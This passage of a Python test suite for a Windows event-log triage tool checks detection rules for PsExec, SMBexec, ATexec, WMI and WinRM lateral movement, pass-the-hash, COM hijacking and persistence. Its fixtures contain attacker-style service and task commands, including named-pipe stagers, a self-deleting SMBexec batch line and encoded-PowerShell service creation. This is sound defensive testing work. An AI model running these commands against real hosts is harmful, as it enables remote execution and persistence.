        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        start_enable = make_event(
            13,
            timestamp=base,
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\services.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\System\CurrentControlSet\services\msdhch\Start",
                "Details": "DWORD (0x00000003)",
                "Image": r"C:\Windows\System32\services.exe",
            },
        )
        imagepath = make_event(
            13,
            timestamp=base,
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\services.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\System\CurrentControlSet\services\msdhch\ImagePath",
                "Details": r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
                "Image": r"C:\Windows\System32\services.exe",
            },
        )
        launcher = make_event(
            1,
            timestamp=base + timedelta(milliseconds=20),
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\services.exe",
            command_line_value=r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
            event_data={
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\services.exe",
                "CommandLine": r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
                "User": r"NT AUTHORITY\SYSTEM",
                "LogonId": "0x3e7",
            },
        )
        start_disable = make_event(
            13,
            timestamp=base + timedelta(milliseconds=40),
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\services.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\System\CurrentControlSet\services\msdhch\Start",
                "Details": "DWORD (0x00000004)",
                "Image": r"C:\Windows\System32\services.exe",
            },
        )

        alerts = persistence.detect([start_enable, imagepath, launcher, start_disable])
        alert = next((item for item in alerts if item.rule_name == "Service ImagePath Command Abuse"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.service, "msdhch")
        self.assertEqual(alert.user, r"NT AUTHORITY\SYSTEM")
        self.assertEqual(alert.process, r"C:\Windows\System32\cmd.exe")
        self.assertIn(r"cmd.exe /c echo msdhch > \\.\pipe\msdhch", alert.evidence.get("payloads", []))
        self.assertIn(
            r"HKLM\System\CurrentControlSet\services\msdhch\ImagePath",
            alert.evidence.get("registry_paths", []),
        )

    def test_local_service_pipe_stager_does_not_trigger_psexec_named_pipe_alert(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        imagepath = make_event(
            13,
            timestamp=base,
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\services.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\System\CurrentControlSet\services\msdhch\ImagePath",
                "Details": r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
                "Image": r"C:\Windows\System32\services.exe",
            },
        )
        launcher = make_event(
            1,
            timestamp=base + timedelta(milliseconds=20),
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\services.exe",
            command_line_value=r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
            event_data={
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\services.exe",
                "CommandLine": r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
                "User": r"NT AUTHORITY\SYSTEM",
                "LogonId": "0x3e7",
            },
        )

        alerts = lateral_movement.detect([imagepath, launcher])
        self.assertFalse(any(item.rule_name == "PsExec Named Pipe Stager" for item in alerts))

    def test_renamed_psexec_service_pipes_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        base_pipe = make_event(
            17,
            timestamp=base,
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\svchost.exe",
            event_data={"Image": r"C:\Windows\svchost.exe", "PipeName": r"\svchost", "ProcessId": "1120"},
        )
        stdin_pipe = make_event(
            17,
            timestamp=base + timedelta(milliseconds=100),
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\svchost.exe",
            event_data={"Image": r"C:\Windows\svchost.exe", "PipeName": r"\svchost-MSEDGEWIN10-8116-stdin", "ProcessId": "1120"},
        )
        stdout_pipe = make_event(
            17,
            timestamp=base + timedelta(milliseconds=120),
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\svchost.exe",
            event_data={"Image": r"C:\Windows\svchost.exe", "PipeName": r"\svchost-MSEDGEWIN10-8116-stdout", "ProcessId": "1120"},
        )
        stderr_pipe = make_event(
            17,
            timestamp=base + timedelta(milliseconds=140),
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\svchost.exe",
            event_data={"Image": r"C:\Windows\svchost.exe", "PipeName": r"\svchost-MSEDGEWIN10-8116-stderr", "ProcessId": "1120"},
        )
        stdin_connect = make_event(
            18,
            timestamp=base + timedelta(milliseconds=220),
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\PsExec.exe",
            event_data={"Image": r"C:\Windows\System32\PsExec.exe", "PipeName": r"\svchost-MSEDGEWIN10-8116-stdin", "ProcessId": "8116"},
        )
        stdout_connect = make_event(
            18,
            timestamp=base + timedelta(milliseconds=240),
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\PsExec.exe",
            event_data={"Image": r"C:\Windows\System32\PsExec.exe", "PipeName": r"\svchost-MSEDGEWIN10-8116-stdout", "ProcessId": "8116"},
        )

        alerts = lateral_movement.detect([base_pipe, stdin_pipe, stdout_pipe, stderr_pipe, stdin_connect, stdout_connect])
        alert = next((item for item in alerts if item.rule_name == "Renamed PsExec Service Pipes"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.process, r"C:\Windows\svchost.exe")
        self.assertEqual(alert.evidence.get("base_pipe"), r"\svchost")
        self.assertIn(r"\svchost-MSEDGEWIN10-8116-stdin", alert.evidence.get("stdio_pipes", []))

    def test_windows_update_uscheduler_command_hijack_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        cmdline = make_event(
            13,
            timestamp=base,
            computer="LAPTOP01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\svchost.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler\51999\cmdLine",
                "Details": r"C:\Windows\System32\cmd.exe",
                "Image": r"C:\Windows\System32\svchost.exe",
            },
        )
        start_arg = make_event(
            13,
            timestamp=base + timedelta(milliseconds=20),
            computer="LAPTOP01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\svchost.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler\51999\startArg",
                "Details": r'/c "whoami > c:\x.txt & whoami /priv >>c:\x.txt"',
                "Image": r"C:\Windows\System32\svchost.exe",
            },
        )
        pause_arg = make_event(
            13,
            timestamp=base + timedelta(milliseconds=40),
            computer="LAPTOP01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\svchost.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler\51999\pauseArg",
                "Details": r'/c "whoami > c:\x.txt & whoami /priv >>c:\x.txt"',
                "Image": r"C:\Windows\System32\svchost.exe",
            },
        )

        alerts = persistence.detect([cmdline, start_arg, pause_arg])
        alert = next((item for item in alerts if item.rule_name == "Windows Update UScheduler Command Hijack"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("scheduler_id"), "51999")
        self.assertEqual(alert.evidence.get("cmd_line"), r"C:\Windows\System32\cmd.exe")

    def test_psexec_remote_execution_sequence_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        service = make_event(
            7045,
            timestamp=base,
            computer="SERVER01",
            event_data={
                "ServiceName": "genusn",
                "ImagePath": r"cmd.exe /c echo genusn > \\.\pipe\genusn",
            },
        )
        stager = make_event(
            4688,
            timestamp=base + timedelta(seconds=15),
            computer="SERVER01",
            subject_user="SERVER01$",
            subject_domain="WORKGROUP",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            command_line_value=r"cmd.exe /c echo genusn > \\.\pipe\genusn",
        )

        alerts = lateral_movement.detect([service, stager])
        alert = next((item for item in alerts if item.rule_name == "PsExec Remote Execution Sequence"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("pipe_name"), "genusn")

    def test_smbexec_remote_execution_sequence_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        binary = r"%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat"
        service_a = make_event(
            4697,
            timestamp=base,
            computer="SERVER01",
            event_data={"ServiceName": "BTOBTO", "ServiceFileName": binary},
        )
        service_b = make_event(
            7045,
            timestamp=base + timedelta(seconds=5),
            computer="SERVER01",
            event_data={"ServiceName": "BTOBTO", "ImagePath": binary},
        )

        alerts = lateral_movement.detect([service_a, service_b])
        alert = next((item for item in alerts if item.rule_name == "SMBexec Remote Execution Sequence"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.service, "BTOBTO")

    def test_atexec_remote_task_execution_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        content = (
            "<Task><Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId></Principal></Principals>"
            "<Settings><Hidden>true</Hidden></Settings>"
            "<Actions><Exec><Command>cmd.exe</Command><Arguments>/C whoami > %windir%\\Temp\\bouWFQYO.tmp</Arguments></Exec></Actions></Task>"
        )
        created = make_event(
            4698,
            timestamp=base,
            computer="SERVER01",
            event_data={"TaskName": r"\bouWFQYO", "TaskContent": content},
        )
        deleted = make_event(
            4699,
            timestamp=base + timedelta(seconds=30),
            computer="SERVER01",
            event_data={"TaskName": r"\bouWFQYO"},
        )

        alerts = lateral_movement.detect([created, deleted])
        alert = next((item for item in alerts if item.rule_name == "ATexec Remote Task Execution"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.scheduled_task, r"\bouWFQYO")

    def test_pass_the_hash_logon_detection_with_logon_id_enrichment(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        logon = make_event(
            4624,
            timestamp=base,
            computer="PC01.example.corp",
            target_user="user01",
            target_domain="EXAMPLE",
            logon_type="9",
            process_name_value=r"C:\Windows\System32\svchost.exe",
            source_ip="::1",
            event_data={
                "TargetUserName": "user01",
                "TargetDomainName": "EXAMPLE",
                "LogonType": "9",
                "LogonProcessName": "seclogo",
                "TargetLogonId": "0x0000000004530f0f",
                "SubjectLogonId": "0x00000000018a7875",
                "ProcessName": r"C:\Windows\System32\svchost.exe",
            },
        )
        privileges = make_event(
            4672,
            timestamp=base + timedelta(seconds=1),
            computer="PC01.example.corp",
            subject_user="user01",
            subject_domain="EXAMPLE",
            event_data={"SubjectLogonId": "0x0000000004530f0f"},
        )

        alerts = credential_access.detect([logon, privileges])
        alert = next((item for item in alerts if item.rule_name == "Pass-the-Hash Logon"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"EXAMPLE\user01")
        self.assertEqual(alert.evidence.get("logon_id"), "0x0000000004530f0f")
        self.assertTrue(alert.evidence.get("privileged_followup"))
        self.assertIn(4672, alert.evidence.get("related_event_ids", []))

    def test_com_hijack_detection_from_sysmon_registry_events(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        inproc = make_event(
            13,
            timestamp=base,
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            event_data={
                "TargetObject": r"HKU\S-1-5-21-1-2-3-1000_CLASSES\CLSID\{49CBB1C7-97D1-485A-9EC1-A26065633066}\InProcServer32\{Default}",
                "Details": r"C:\Users\User\Documents\mapid.tlb",
                "Image": r"C:\Windows\system32\reg.exe",
            },
        )
        treatas = make_event(
            13,
            timestamp=base + timedelta(seconds=1),
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            event_data={
                "TargetObject": r"HKU\S-1-5-21-1-2-3-1000_CLASSES\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs\{Default}",
                "Details": "{49CBB1C7-97D1-485A-9EC1-A26065633066}",
                "Image": r"C:\Windows\system32\reg.exe",
            },
        )

        alerts = persistence.detect([inproc, treatas])
        alert = next((item for item in alerts if item.rule_name == "COM Hijacking Persistence"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.mitre_technique, "T1546.015")
        self.assertEqual(alert.evidence.get("dll_path"), r"C:\Users\User\Documents\mapid.tlb")

    def test_wmi_remote_execution_process_tree_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        cmd = make_event(
            1,
            timestamp=base,
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\wbem\WmiPrvSE.exe",
            command_line_value=r"cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__123 2>&1",
            event_data={
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                "CommandLine": r"cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__123 2>&1",
                "User": r"IEWIN7\IEUser",
                "LogonId": "0x00000000001d313d",
            },
        )

        alerts = lateral_movement.detect([cmd])
        alert = next((item for item in alerts if item.rule_name == "WMI Remote Execution"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"IEWIN7\IEUser")
        self.assertEqual(alert.mitre_technique, "T1047")
        self.assertIn("cmd.exe", json.dumps(alert.evidence))

    def test_winrm_process_tree_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        cmd = make_event(
            1,
            timestamp=base,
            computer="SERVER01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            parent_process_value=r"C:\Windows\System32\wsmprovhost.exe",
            command_line_value=r"powershell.exe -nop -c whoami",
            event_data={
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "ParentImage": r"C:\Windows\System32\wsmprovhost.exe",
                "CommandLine": r"powershell.exe -nop -c whoami",
                "User": r"SERVER01\Administrator",
                "LogonId": "0x1111",
            },
        )

        alerts = lateral_movement.detect([cmd])
        alert = next((item for item in alerts if item.rule_name == "WinRM Remote Execution"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"SERVER01\Administrator")
        self.assertEqual(alert.mitre_technique, "T1021.006")

    def test_remote_named_pipe_execution_detection(self):
        event = make_event(
            5145,
            computer="SERVER01",
            source_ip="10.10.10.5",
            target_user="admin",
            target_domain="CORP",
            event_data={
                "ShareName": r"\\*\IPC$",
                "RelativeTargetName": "svcctl",
                "IpAddress": "10.10.10.5",
            },
        )
        alerts = lateral_movement.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Remote Service Control Pipe Access"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.source_ip, "10.10.10.5")

    def test_suspicious_scheduled_task_and_service_configuration_detection(self):
        task = make_event(
            4698,
            computer="SERVER01",
            subject_user="admin",
            subject_domain="CORP",
            event_data={
                "TaskName": r"\BackdoorTask",
                "TaskContent": "<Command>powershell.exe -EncodedCommand SQBFAFgA</Command>",
            },
        )
        sc = make_event(
            4688,
            computer="SERVER01",
            subject_user="admin",
            subject_domain="CORP",
            command_line_value=r'sc.exe create upsvc binPath= "cmd.exe /c powershell -enc SQBFAFgA"',
            process_name_value=r"C:\Windows\System32\sc.exe",
        )

        task_alerts = persistence.detect([task])
        service_alerts = persistence.detect([sc])
        self.assertTrue(any(item.rule_name == "Suspicious Scheduled Task" for item in task_alerts))
        self.assertTrue(
            any(
                item.rule_name in {
                    "Suspicious Service Configuration Command",
                    "Service Creation Command",
                    "Remote Service Creation Command",
                    "Service ImagePath Command Abuse",
                    "Service Failure Command Abuse",
                }
                for item in service_alerts
            )
        )

    def test_high_priority_findings_promote_to_incidents(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        logon = make_event(
            4624,
            timestamp=base,
            computer="PC01.example.corp",
            target_user="user01",
            target_domain="EXAMPLE",
            logon_type="9",
            event_data={
                "TargetUserName": "user01",
                "TargetDomainName": "EXAMPLE",
                "LogonType": "9",
                "LogonProcessName": "seclogo",
                "TargetLogonId": "0x0000000004530f0f",
            },
        )
        privileges = make_event(
            4672,
            timestamp=base + timedelta(seconds=1),
            computer="PC01.example.corp",
            subject_user="user01",
            subject_domain="EXAMPLE",
            event_data={"SubjectLogonId": "0x0000000004530f0f"},
        )

        alerts = credential_access.detect([logon, privileges])
        signals, findings, _ = alerts_to_signals_findings(alerts)
        incidents = build_incidents([logon, privileges], signals, findings, [])

        incident = next((item for item in incidents if item.incident_type == "pass_the_hash_activity"), None)
        self.assertIsNotNone(incident)
        self.assertEqual(incident.user, r"EXAMPLE\user01")
        self.assertIn("NewCredentials session", incident.summary)


class DatasetRegressionTests(unittest.TestCase):
    def _run_dataset(self, source: Path, case_name: str) -> dict:
        cases_dir = tempfile.mkdtemp(prefix="triage-regression-", dir=str(ROOT))
        self.addCleanup(shutil.rmtree, cases_dir, True)

        rc = cli_main(
            [
                "investigate",
                "--evtx",
                str(source),
                "--case",
                case_name,
                "--cases-dir",
                cases_dir,
            ]
        )
        self.assertEqual(rc, 0)

        findings_path = Path(cases_dir) / case_name / "findings.json"
        self.assertTrue(findings_path.is_file(), msg=f"missing findings.json for {case_name}")
        with open(findings_path, "r", encoding="utf-8") as handle:
            return json.load(handle)

    @unittest.skipUnless(CLEAN_EVTX_DIR.is_dir(), "clean baseline EVTX directory not available")
    def test_clean_baseline_has_no_incidents(self):
        findings = self._run_dataset(CLEAN_EVTX_DIR, "test-clean-baseline")
        self.assertEqual(findings["summary"]["incident_count"], 0)

    @unittest.skipUnless(MALICIOUS_EVTX_DIR.is_dir(), "malicious EVTX directory not available")
    def test_malicious_dataset_retains_4104_incident_and_user_normalization(self):
        findings = self._run_dataset(MALICIOUS_EVTX_DIR, "test-malicious-4104")
        self.assertEqual(findings["summary"]["signal_count"], 3)
        self.assertEqual(findings["summary"]["finding_count"], 3)
        self.assertEqual(findings["summary"]["incident_count"], 2)
        incident = next(
            (item for item in findings["incidents"] if item.get("incident_type") == "powershell_backdoor_provisioning"),
            None,
        )
        self.assertIsNotNone(incident)
        self.assertEqual(incident["host"], "bcorp-prod-srv1")
        self.assertEqual(incident["source_ip"], "4.231.239.126")
        self.assertEqual(incident["user_display"], "bcorpserveradmin")
        self.assertEqual(incident["user_canonical"], r"bcorp-prod-srv1\bcorpserveradmin")
        self.assertIn("CreateBackdoor", incident["summary"])
        self.assertEqual(
            [item for item in findings["incidents"] if item.get("incident_type") == "remote_credential_sequence"],
            [],
        )

    @unittest.skipUnless(HAYABUSA_ASREP_SAMPLE.is_file(), "AS-REP EVTX sample not available")
    def test_attack_sample_asrep_generates_finding_and_incident(self):
        findings = self._run_dataset(HAYABUSA_ASREP_SAMPLE, "test-attack-sample-asrep")
        finding = next((item for item in findings["findings"] if item.get("title") == "AS-REP Roasting"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "asrep_roasting"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PETITPOTAM_AUDIT_FINDINGS.is_file() or PETITPOTAM_RPC_SAMPLE.is_file(), "PetitPotam RPC data not available")
    def test_attack_sample_petitpotam_generates_finding_and_incident(self):
        if PETITPOTAM_AUDIT_FINDINGS.is_file():
            with open(PETITPOTAM_AUDIT_FINDINGS, "r", encoding="utf-8") as handle:
                raw_payloads = json.load(handle)["raw_events"]

            def to_event(payload: dict) -> NormalizedEvent:
                return NormalizedEvent(
                    event_id=payload["event_id"],
                    timestamp=datetime.fromisoformat(payload["timestamp"]) if payload.get("timestamp") else None,
                    computer=payload.get("computer", ""),
                    channel=payload.get("channel", ""),
                    provider=payload.get("provider", ""),
                    target_user=payload.get("target_user", ""),
                    target_domain=payload.get("target_domain", ""),
                    subject_user=payload.get("subject_user", ""),
                    subject_domain=payload.get("subject_domain", ""),
                    account_name=payload.get("account_name", ""),
                    logon_user=payload.get("logon_user", ""),
                    source_ip=payload.get("source_ip", ""),
                    destination_ip=payload.get("destination_ip", ""),
                    logon_type=payload.get("logon_type", ""),
                    status=payload.get("status", ""),
                    sub_status=payload.get("sub_status", ""),
                    share_name_value=payload.get("share_name", ""),
                    command_line_value=payload.get("command_line", ""),
                    process_name_value=payload.get("process_name", ""),
                    parent_process_value=payload.get("parent_process", ""),
                    service_name_value=payload.get("service_name", ""),
                    event_data=payload.get("event_data", {}),
                    raw_xml="",
                )

            events = [to_event(item) for item in raw_payloads]
            alerts = credential_access.detect(events)
            signals, findings_list, _ = alerts_to_signals_findings(alerts)
            incidents = build_incidents(events, signals, findings_list, [])
            finding = next((item for item in findings_list if item.title == "PetitPotam RPC Coercion"), None)
            incident = next((item for item in incidents if item.incident_type == "petitpotam_rpc_coercion"), None)
            self.assertIsNotNone(finding)
            self.assertIsNotNone(incident)
            self.assertEqual(finding.evidence.get("interface_uuid"), "{c681d488-d850-11d0-8c52-00c04fd90f7e}")
            self.assertIn("\\\\10.0.2.14", finding.evidence.get("network_address", ""))
            return

        findings = self._run_dataset(PETITPOTAM_RPC_SAMPLE, "test-attack-sample-petitpotam")
        finding = next((item for item in findings["findings"] if item.get("title") == "PetitPotam RPC Coercion"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "petitpotam_rpc_coercion"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("interface_uuid"), "{c681d488-d850-11d0-8c52-00c04fd90f7e}")
        self.assertIn("\\\\10.0.2.14", finding["evidence"].get("network_address", ""))

    @unittest.skipUnless(ZEROLOGON_RPC_SAMPLE.is_file(), "Zerologon RPC EVTX sample not available")
    def test_attack_sample_zerologon_generates_finding_and_incident(self):
        findings = self._run_dataset(ZEROLOGON_RPC_SAMPLE, "test-attack-sample-zerologon")
        finding = next((item for item in findings["findings"] if item.get("title") == "Zerologon RPC Activity"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "zerologon_rpc_activity"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("interface_uuid"), "{12345678-1234-abcd-ef00-01234567cffb}")
        self.assertEqual(finding["evidence"].get("event_count"), 5)

    @unittest.skipUnless(MACHINE_ACCOUNT_SECRET_SAMPLE.is_file(), "machine-account secret EVTX sample not available")
    def test_attack_sample_machine_account_secret_generates_finding_and_incident(self):
        findings = self._run_dataset(MACHINE_ACCOUNT_SECRET_SAMPLE, "test-attack-sample-machine-account-secret")
        finding = next((item for item in findings["findings"] if item.get("title") == "Machine Account Secret Modified"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "machine_account_secret_modified"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("$MACHINE.ACC\\CurrVal", " ".join(finding["evidence"].get("registry_paths", [])))

    @unittest.skipUnless(REMOTE_SAM_REGISTRY_SAMPLE.is_file(), "remote SAM registry EVTX sample not available")
    def test_attack_sample_remote_sam_registry_generates_specific_incident(self):
        findings = self._run_dataset(REMOTE_SAM_REGISTRY_SAMPLE, "test-attack-sample-remote-sam-registry")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote SAM Registry Hive Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "remote_sam_registry_hive_access"), None)
        generic = [item for item in findings["incidents"] if item.get("incident_type") == "remote_credential_sequence"]
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding.get("user"), r"3B\samir")
        self.assertEqual(finding["evidence"].get("primary_source_ip"), "172.16.66.25")
        self.assertEqual(sorted(finding["evidence"].get("staged_hives", [])), ["SAM", "SECURITY", "SYSTEM"])
        self.assertEqual(generic, [])

    @unittest.skipUnless(KERBEROS_PASSWORD_SPRAY_SAMPLE.is_file(), "Kerberos spray EVTX sample not available")
    def test_attack_sample_kerberos_password_spray_generates_finding_and_incident(self):
        findings = self._run_dataset(KERBEROS_PASSWORD_SPRAY_SAMPLE, "test-attack-sample-kerberos-spray")
        finding = next((item for item in findings["findings"] if item.get("title") == "Kerberos Password Spray"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "kerberos_password_spray"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["source_ip"], "172.16.66.1")
        self.assertGreaterEqual(len(finding["evidence"].get("target_accounts", [])), 5)
        self.assertIn("0x18", finding["evidence"].get("status_codes", []))

    @unittest.skipUnless(PROTECTED_STORAGE_RPC_SAMPLE.is_file(), "protected storage EVTX sample not available")
    def test_attack_sample_protected_storage_rpc_generates_finding_and_incident(self):
        findings = self._run_dataset(PROTECTED_STORAGE_RPC_SAMPLE, "test-attack-sample-protected-storage")
        finding = next((item for item in findings["findings"] if item.get("title") == "Protected Storage RPC Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "protected_storage_rpc_access"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["source_ip"], "172.16.66.1")
        self.assertEqual(finding["evidence"].get("relative_target"), "protected_storage")
        self.assertEqual(finding["share_name"], r"\\*\IPC$")

    @unittest.skipUnless(TEAMVIEWER_DUMPER_SAMPLE.is_file(), "TeamViewer dumper EVTX sample not available")
    def test_attack_sample_teamviewer_dumper_generates_finding_and_incident(self):
        findings = self._run_dataset(TEAMVIEWER_DUMPER_SAMPLE, "test-attack-sample-teamviewer-dumper")
        finding = next((item for item in findings["findings"] if item.get("title") == "TeamViewer Credential Memory Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "teamviewer_credential_memory_access"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("TeamViewer.exe", finding["evidence"].get("target_image", ""))
        self.assertIn("frida", finding["evidence"].get("source_image", "").lower())

    @unittest.skipUnless(KEKEO_TSSSP_SAMPLE.is_file(), "Kekeo TSSSP EVTX sample not available")
    def test_attack_sample_kekeo_tsssp_generates_finding_and_incident(self):
        findings = self._run_dataset(KEKEO_TSSSP_SAMPLE, "test-attack-sample-kekeo-tsssp")
        finding = next((item for item in findings["findings"] if item.get("title") == "Kekeo TSSSP Named Pipe"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "kekeo_tsssp_named_pipe"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("pipe_name"), r"\kekeo_tsssp_endpoint")
        self.assertTrue(any("kekeo.exe" in item.lower() for item in finding["evidence"].get("process_images", [])))

    @unittest.skipUnless(MITRE_RBCD_SAMPLE.is_file(), "RBCD delegation EVTX sample not available")
    def test_attack_sample_rbcd_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_RBCD_SAMPLE, "test-attack-sample-rbcd")
        finding = next((item for item in findings["findings"] if item.get("title") == "Delegation Configuration Changed"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "delegation_configuration_change"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(UNCONSTRAINED_DELEGATION_SAMPLE.is_file(), "unconstrained delegation EVTX sample not available")
    def test_attack_sample_unconstrained_delegation_generates_finding_and_incident(self):
        findings = self._run_dataset(UNCONSTRAINED_DELEGATION_SAMPLE, "test-attack-sample-unconstrained-delegation")
        finding = next((item for item in findings["findings"] if item.get("title") == "Delegation Configuration Changed"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "delegation_configuration_change"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
